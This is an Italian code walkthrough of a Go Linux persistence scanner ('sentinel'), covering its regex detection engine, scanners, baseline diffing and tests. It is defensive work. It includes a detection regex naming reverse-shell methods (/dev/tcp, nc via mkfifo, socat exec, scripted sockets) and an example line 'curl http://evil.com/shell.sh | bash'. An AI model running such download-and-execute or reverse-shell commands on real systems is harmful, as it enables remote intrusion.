# Panoramica dell'implementazione

Questo documento esamina il codice vero e proprio. Tratteremo il motore di pattern, la struttura dei moduli scanner, la pipeline di esecuzione parallela, il baseline diffing e il meccanismo della ignore-list.

## Panoramica della struttura dei file

```
systemd-persistence-scanner/
├── cmd/sentinel/
│   └── main.go              # Entry point, blank import for scanner registration
├── pkg/types/
│   └── types.go             # Severity, Finding, ScanResult, Scanner interface
├── internal/
│   ├── cli/
│   │   ├── root.go          # Cobra root command, global flags
│   │   ├── scan.go          # Scan subcommand
│   │   └── baseline.go      # Baseline save/diff subcommands
│   ├── scanner/
│   │   ├── scanner.go       # Registry and RunAll()
│   │   ├── patterns.go      # 16 compiled regexes and MatchLine()
│   │   ├── helpers.go       # Shared filesystem utilities
│   │   ├── systemd.go       # Systemd unit scanner
│   │   ├── cron.go          # Cron job scanner
│   │   ├── profile.go       # Shell profile scanner
│   │   ├── ssh.go           # SSH config/keys scanner
│   │   ├── sshrc.go         # System-wide sshrc scanner
│   │   ├── preload.go       # LD_PRELOAD scanner
│   │   ├── kernel.go        # Kernel module scanner
│   │   ├── udev.go          # Udev rules scanner
│   │   ├── initd.go         # Init.d/rc.local scanner
│   │   ├── xdg.go           # XDG autostart scanner
│   │   ├── atjob.go         # At job scanner
│   │   ├── motd.go          # MOTD scripts scanner
│   │   ├── pam.go           # PAM config scanner
│   │   ├── logrotate.go     # Logrotate hooks scanner
│   │   ├── generator.go     # Systemd generator scanner
│   │   ├── completion.go    # Bash completion scanner
│   │   └── netifhook.go     # Network interface hooks scanner
│   ├── baseline/
│   │   └── baseline.go      # Snapshot save/load/diff
│   ├── config/
│   │   └── config.go        # Ignore-list parsing and filtering
│   ├── report/
│   │   ├── terminal.go      # Color-coded terminal output
│   │   └── json.go          # Structured JSON output
│   └── ui/
│       ├── banner.go        # ASCII SENTINEL banner
│       ├── color.go         # ANSI color functions (fatih/color wrappers)
│       └── spinner.go       # Braille frame spinner animation
└── testdata/                # Per-scanner fixture files
```

## Il motore di pattern

Il motore di pattern è il meccanismo di detection centrale. Ogni scanner gli delega l'analisi del contenuto.

### Pattern regex compilati

Tutti i pattern sono compilati una volta all'inizializzazione del package. Ogni pattern prende di mira una specifica classe di comportamento sospetto:

```go
var ReverseShellPattern = regexp.MustCompile(
    `/dev/tcp/` +
        `|` +
        `\bmkfifo\b.*\bnc\b` +
        `|` +
        `\bsocat\b.*\bexec\b` +
        `|` +
        `python[23]?\s+-c\s+.*socket` +
        `|` +
        `perl\s+-e\s+.*socket` +
        `|` +
        `ruby\s+-rsocket`,
)
```

Questa singola regex corrisponde a sei diverse implementazioni di reverse shell. Gli ancoraggi di word boundary `\b` prevengono i falsi positivi su stringhe che contengono per caso "nc" come sottostringa (come "once" o "function").

La chiamata `regexp.MustCompile` va in panic se la regex non è valida. È voluto: un pattern rotto è un bug a compile-time, non un errore a runtime. Se il pattern compila, è garantito che funzioni per tutta la vita del programma.

### La slice SuspiciousPatterns

I pattern sono raccolti in una slice ordinata con etichette di severità:

```go
var SuspiciousPatterns = []PatternMatch{
    {ReverseShellPattern, types.SeverityCritical, "reverse shell pattern"},
    {DownloadExecPattern, types.SeverityHigh, "download-and-execute chain"},
    {EncodingPattern, types.SeverityHigh, "encoded/obfuscated payload"},
    {NetworkToolPattern, types.SeverityMedium, "network tool invocation"},
    // ... 12 more patterns
}
```

L'ordinamento non influisce sul matching (tutti i pattern vengono controllati), ma documenta la gerarchia di severità. I pattern critical come reverse shell e manipolazione SUID compaiono per primi. I pattern medium come le invocazioni di strumenti di rete compaiono dopo.

### MatchLine: l'API centrale

Ogni scanner chiama questa funzione per analizzare una riga di testo:

```go
func MatchLine(
    line string,
) (matched bool, sev types.Severity, label string) {
    best := types.SeverityInfo
    for _, p := range SuspiciousPatterns {
        if p.Pattern.MatchString(line) {
            if !matched || p.Severity > best {
                best = p.Severity
                label = p.Label
            }
            matched = true
        }
    }
    return matched, best, label
}
```

La decisione di design chiave: quando una riga corrisponde a più pattern, viene ritornata solo la severità più alta. Considera questa riga:

```
curl http://evil.com/shell.sh | bash
```

Questa corrisponde a NetworkToolPattern (medium: "network tool invocation") e a DownloadExecPattern (high: "download-and-execute chain"). MatchLine ritorna "high" con l'etichetta "download-and-execute chain" perché è la classificazione più specifica e pericolosa.

Senza questa deduplicazione, una singola riga malevola genererebbe più finding a severità diverse, creando rumore e confusione nel report.

## Struttura dei moduli scanner

Ogni scanner segue la stessa struttura. Esaminiamo lo scanner systemd come esempio più complesso.

### Registrazione e interfaccia

```go
func init() {
    Register(&SystemdScanner{})
}

type SystemdScanner struct{}

func (s *SystemdScanner) Name() string {
    return systemdScannerName
}
```

La struct vuota non porta alcuno stato. Gli scanner sono stateless: ricevono un percorso root, leggono file e ritornano finding. Nessuna cache, nessuna configurazione, nessun effetto collaterale oltre alle letture del filesystem.

### Enumerazione delle directory

```go
func (s *SystemdScanner) Scan(root string) []types.Finding {
    var findings []types.Finding

    for _, dir := range systemdDirs {
        resolved := ResolveRoot(root, dir)
        findings = append(findings, s.scanDir(resolved)...)
    }

    for _, home := range FindUserDirs(root) {
        userDir := filepath.Join(home, ".config", "systemd", "user")
        findings = append(findings, s.scanDir(userDir)...)
    }

    return findings
}
```

Lo scanner controlla tre directory di sistema (/etc/systemd/system, /run/systemd/system, /usr/lib/systemd/system) più le directory per-utente sotto ~/.config/systemd/user/. ResolveRoot() traduce i percorsi assoluti relativamente alla root di scansione, abilitando la scansione di filesystem montati o di fixture di test.

### Analisi dei file unit

Il metodo scanDir filtra i file per estensione (.service, .timer, .socket, .path) e mappa ogni estensione alla propria tecnica MITRE:

```go
mitre := mitreSystemd
switch ext {
case ".timer":
    mitre = mitreTimer
case ".path":
    mitre = mitrePath
}
```

I timer ricevono T1053.006 (Systemd Timers), le path unit ricevono T1543.002 (Systemd Service) e i servizi/socket ricevono il default T1543.002. Questa granularità conta per la mappatura della copertura ATT&CK.

Il metodo analyzeUnit fa il parsing delle direttive Exec:

```go
for _, line := range lines {
    trimmed := strings.TrimSpace(line)
    for _, directive := range execDirectives {
        if !strings.HasPrefix(trimmed, directive) {
            continue
        }
        cmd := strings.TrimPrefix(trimmed, directive)
        cmd = strings.TrimPrefix(cmd, "-")

        matched, sev, label := MatchLine(cmd)
        if matched {
            findings = append(findings, types.Finding{...})
        }
    }
}
```

Il secondo TrimPrefix rimuove il prefisso "-" che systemd usa per indicare "ignora l'exit code". Il contenuto del comando va a MatchLine() per l'analisi dei pattern.

Dopo l'analisi del contenuto, lo scanner controlla due proprietà del filesystem:

```go
if IsWorldWritable(path) {
    findings = append(findings, types.Finding{
        Severity: types.SeverityMedium,
        Title:    "World-writable unit file",
    })
}

if ModifiedWithin(path, 24*time.Hour) {
    findings = append(findings, types.Finding{
        Severity: types.SeverityMedium,
        Title:    "Recently modified unit file",
    })
}
```

World-writable significa che qualsiasi utente può modificare il file per iniettare comandi ExecStart malevoli. Modificato di recente (entro 24 ore) è un'euristica: i file unit legittimi cambiano raramente, ma una backdoor appena piazzata è stata appena scritta.

### Scansione degli override drop-in

Systemd supporta directory drop-in (service-name.d/*.conf) che sovrascrivono il file unit principale. Gli attaccanti possono aggiungere un override che sostituisce ExecStart senza toccare il file originale:

```go
entries := ListDir(dir)
for _, e := range entries {
    if e.IsDir() && strings.HasSuffix(e.Name(), ".d") {
        dropinDir := filepath.Join(dir, e.Name())
        for _, f := range ListFiles(dropinDir) {
            if strings.HasSuffix(f, ".conf") {
                findings = append(findings, s.analyzeUnit(f, mitreSystemd)...)
            }
        }
    }
}
```

Questo intercetta `sshd.service.d/override.conf` contenente `ExecStartPost=/tmp/.backdoor`.

## Helper condivisi del filesystem

Il file helpers.go fornisce operazioni sicure sui file usate da tutti gli scanner.

### Gestione controllata dei permessi

```go
func ReadLines(path string) []string {
    f, err := os.Open(path)
    if err != nil {
        return nil
    }
    defer f.Close()

    var lines []string
    sc := bufio.NewScanner(f)
    for sc.Scan() {
        lines = append(lines, sc.Text())
    }
    return lines
}
```

Ritornare nil invece di un errore è voluto. Gli scanner enumerano molte directory, la maggior parte delle quali potrebbe non esistere su un dato sistema. Lo scanner cron controlla /var/spool/cron/crontabs/ che non esiste sui sistemi che non hanno mai usato crontab. Ritornare nil permette al controllo di nil del chiamante di saltare il file silenziosamente.

### L'helper ScanFileForPatterns

Molti scanner usano lo stesso loop: leggi le righe, salta i commenti, chiama MatchLine, raccogli i finding. Questo è estratto in un helper condiviso:

```go
func ScanFileForPatterns(
    path, scannerName, mitre string,
) []types.Finding {
    lines := ReadLines(path)
    var findings []types.Finding

    for _, line := range lines {
        if IsCommentOrEmpty(line) {
            continue
        }
        matched, sev, label := MatchLine(line)
        if matched {
            findings = append(findings, types.Finding{
                Scanner:  scannerName,
                Severity: sev,
                Title:    label,
                Path:     path,
                Evidence: strings.TrimSpace(line),
                MITRE:    mitre,
            })
        }
    }
    return findings
}
```

Scanner come profile.go, sshrc.go e completion.go lo usano direttamente. Gli scanner con parsing personalizzato (systemd, cron, udev) usano MatchLine() direttamente perché devono estrarre i comandi da formati strutturati prima del matching.

## La pipeline di esecuzione parallela

### Come funziona RunAll

```go
func RunAll(root string) []types.Finding {
    var (
        mu  sync.Mutex
        all []types.Finding
        g   errgroup.Group
    )

    for _, s := range registry {
        g.Go(func() error {
            results := s.Scan(root)
            mu.Lock()
            all = append(all, results...)
            mu.Unlock()
            return nil
        })
    }

    _ = g.Wait()
    return all
}
```

La variabile di loop `s` viene catturata correttamente dalla closure in Go 1.22+ (cambio dello scoping delle variabili di loop). Ogni goroutine riceve la propria copia dello scanner.

Il mutex protegge l'append sulla slice condivisa. Questo è l'approccio corretto più semplice. Un'alternativa sarebbero i channel, ma un mutex con append è più chiaro e leggermente più veloce per questo caso d'uso (17 goroutine con piccole raffiche di finding).

errgroup.Wait() blocca finché tutte le goroutine non ritornano. Poiché le nostre goroutine ritornano sempre nil, la gestione degli errori è un no-op. Usiamo errgroup invece di sync.WaitGroup perché errgroup fornisce la stessa semantica di Wait() con un'API più pulita, e se mai avessimo bisogno di propagare gli errori degli scanner, l'infrastruttura è già pronta.

## Baseline diffing

### La chiave composita

L'algoritmo di diff usa una chiave stringa composita per far corrispondere i finding tra le scansioni:

```go
func findingKey(f types.Finding) string {
    return f.Scanner + "|" + f.Path + "|" + f.Title
}
```

Questa chiave identifica un finding univoco. Se lo stesso scanner riporta lo stesso titolo per lo stesso percorso di file, viene considerato lo stesso finding indipendentemente dai cambi di severità. Il delimitatore pipe previene l'ambiguità (nessun valore di campo contiene legittimamente "|").

La severità è esclusa dalla chiave intenzionalmente. Se un file unit world-writable si vede correggere i permessi, il finding scompare del tutto (bene). Se la severità del finding cambia a causa di un aggiornamento del motore di pattern, non compare come "nuovo" (anche questo bene).

### L'algoritmo di diff

```go
func Diff(baseline Snapshot, current []types.Finding) []types.Finding {
    known := make(map[string]bool, len(baseline.Findings))
    for _, f := range baseline.Findings {
        known[findingKey(f)] = true
    }

    var newFindings []types.Finding
    for _, f := range current {
        if !known[findingKey(f)] {
            newFindings = append(newFindings, f)
        }
    }
    return newFindings
}
```

Costruisci un set di chiavi di finding noti dalla baseline. Per ogni finding corrente, controlla se la sua chiave esiste nel set. Se no, è nuovo. Tempo O(n+m), spazio O(n) dove n è la dimensione della baseline ed m è la dimensione della scansione corrente.

## Filtraggio tramite ignore-list

### Design del parser

Il file di ignore usa un formato semplificato simil-YAML:

```yaml
ignore:
  - path: /etc/cron.d/certbot
    scanner: cron
  - title: Kernel module loaded at boot
```

Il parser è una macchina a stati riga per riga scritta a mano. Tiene traccia del fatto che siamo dentro il blocco `ignore:` e accumula i campi in struct IgnoreRule:

```go
func parseIgnoreFile(data []byte) (IgnoreList, error) {
    var list IgnoreList
    var current IgnoreRule
    inIgnore := false

    for _, rawLine := range strings.Split(string(data), "\n") {
        line := strings.TrimSpace(rawLine)

        if line == "ignore:" {
            inIgnore = true
            continue
        }

        if strings.HasPrefix(line, "- ") {
            list.Rules = appendIfSet(list.Rules, current)
            current = IgnoreRule{}
            line = strings.TrimPrefix(line, "- ")
        }

        parseField(&current, strings.TrimSpace(line))
    }

    list.Rules = appendIfSet(list.Rules, current)
    return list, nil
}
```

Un parser YAML completo sarebbe eccessivo per tre campi. Il parser scritto a mano ha zero dipendenze e gestisce esattamente il formato che lo strumento documenta.

### Logica di matching

Il filtro applica una logica AND all'interno di una regola e una logica OR tra le regole:

```go
func (r IgnoreRule) matchesFinding(f types.Finding) bool {
    if r.Path != "" && f.Path != r.Path {
        return false
    }
    if r.Scanner != "" && f.Scanner != r.Scanner {
        return false
    }
    if r.Title != "" && f.Title != r.Title {
        return false
    }
    return true
}
```

I campi vuoti sono wildcard. Una regola con solo `scanner: cron` sopprime tutti i finding di cron. Una regola con `path: /etc/cron.d/certbot` e `scanner: cron` sopprime solo i finding di cron per quello specifico file. Questo permette agli utenti di scrivere regole di soppressione precise senza sopprimere troppo.

## Output a terminale

### Output colorato per severità

Il renderer del terminale ordina i finding per severità (prima i critical) e applica colori per severità:

```go
var severityColor = map[types.Severity]func(a ...any) string{
    types.SeverityCritical: ui.HiRedBold,
    types.SeverityHigh:     ui.RedBold,
    types.SeverityMedium:   ui.YellowBold,
    types.SeverityLow:      ui.CyanBold,
    types.SeverityInfo:     ui.Dim,
}
```

I finding critical compaiono in rosso brillante grassetto. I finding info compaiono attenuati. La gerarchia visiva rende possibile scorrere l'output e individuare immediatamente i finding più pericolosi.

### Lo spinner

Lo spinner gira su una propria goroutine mentre gli scanner lavorano:

```go
func (s *Spinner) run() {
    defer s.wg.Done()
    fmt.Print("\033[?25l")  // hide cursor

    ticker := time.NewTicker(80 * time.Millisecond)
    defer ticker.Stop()

    idx := 0
    for {
        select {
        case <-s.done:
            clearLine()
            fmt.Print("\033[?25h")  // show cursor
            return
        case <-ticker.C:
            frame := frames[idx%len(frames)]
            fmt.Printf("\r  %s %s", CyanBold(frame), Magenta(s.msg))
            idx++
        }
    }
}
```

La sequenza di escape ANSI `\033[?25l` nasconde il cursore per prevenire lo sfarfallio. I frame braille (`⠋ ⠙ ⠹ ⠸ ⠼ ⠴ ⠦ ⠧ ⠇ ⠏`) creano una rotazione fluida a 80ms per frame. Il WaitGroup garantisce che Stop() blocchi finché la goroutine non ha fatto pulizia (cursore ripristinato, riga cancellata).

## Strategia di testing

### Fixture in testdata

Ogni scanner ha fixture di test nella directory testdata/. Le fixture sono file in formato reale con contenuto noto:

```
testdata/
├── systemd/          # .service, .timer, .path files
├── cron/             # Crontab entries
├── ssh/              # sshd_config variants
├── sshrc/            # Clean and malicious sshrc
├── preload/          # ld.so.preload entries
├── kernel/           # modules-load.d and modprobe.d configs
├── udev/             # Udev rules with RUN+=
├── initd/            # Init scripts and rc.local
├── xdg/              # .desktop files
├── atjob/            # At job spool files
├── motd/             # MOTD scripts
├── pam/              # PAM configs
├── logrotate/        # Clean and malicious logrotate configs
├── generator/        # Generator executables
├── completion/       # Bash completion scripts
└── netifhook/        # Network interface hooks
```

I test usano t.TempDir() per creare un albero di filesystem isolato, copiarvi i dati delle fixture e puntare lo scanner alla root temporanea:

```go
func TestSystemdScanner_MaliciousService(t *testing.T) {
    root := t.TempDir()
    svcDir := filepath.Join(root, "etc", "systemd", "system")
    os.MkdirAll(svcDir, 0o750)

    src := filepath.Join(testdataDir(), "systemd", "backdoor.service")
    data, _ := os.ReadFile(src)
    writeTestFile(t, filepath.Join(svcDir, "backdoor.service"), string(data))

    s := &SystemdScanner{}
    findings := s.Scan(root)

    // Assert findings match expected detections
}
```

Lo scanner non ha idea di essere eseguito su una directory temporanea. Chiama ResolveRoot(root, "/etc/systemd/system") che ritorna il percorso temporaneo. Ecco perché ogni scanner accetta un parametro root invece di usare percorsi assoluti hardcoded.

### Esecuzione dei test

```bash
go test -race ./...
```

Il flag `-race` abilita il race detector, che è essenziale perché gli scanner vengono eseguiti in modo concorrente. Qualsiasi accesso non sicuro allo stato condiviso durante RunAll() causerà il fallimento di un test con una traccia dettagliata delle goroutine.

## Dipendenze

### Perché ciascuna dipendenza

- **github.com/spf13/cobra v1.10.2**: framework CLI. Fornisce sottocomandi, flag persistenti, generazione dell'help. La scelta standard per gli strumenti CLI in Go
- **github.com/fatih/color v1.19.0**: output a colori nel terminale. Gestisce i codici ANSI e la compatibilità con Windows. La libreria di colori per terminale in Go più usata
- **golang.org/x/sync v0.20.0**: fornisce errgroup per un coordinamento strutturato delle goroutine. Parte della libreria standard estesa di Go

Zero dipendenze nella logica di scansione. cobra e color sono questioni di CLI/UI. errgroup è infrastruttura di concorrenza.

## Prossimi passi

Hai visto come funziona il codice. Ora:

1. **Prova le sfide** - [04-CHALLENGES.it.md](./04-CHALLENGES.it.md) contiene idee di estensione, dall'aggiunta di nuovi scanner all'integrazione con YARA
2. **Esegui su testdata** - `sentinel scan --root testdata` mette alla prova il motore di pattern su fixture note come malevole
3. **Aggiungi uno scanner** - Scegli un meccanismo di persistenza non coperto (Docker, containerd, cloud-init) e implementalo seguendo il pattern esistente
